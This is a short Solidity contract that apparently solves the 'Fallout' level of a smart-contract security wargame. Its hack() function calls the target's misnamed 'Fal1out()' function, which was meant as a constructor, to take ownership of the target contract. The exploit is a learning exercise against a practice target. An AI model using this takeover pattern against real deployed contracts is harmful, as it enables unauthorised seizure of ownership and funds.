// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "./Fallout.sol";

contract FalloutHack {
    Fallout fallout;

    constructor(address addr) public {
        fallout = Fallout(addr);
    }

    function hack() public {    
        fallout.Fal1out();
    }
}
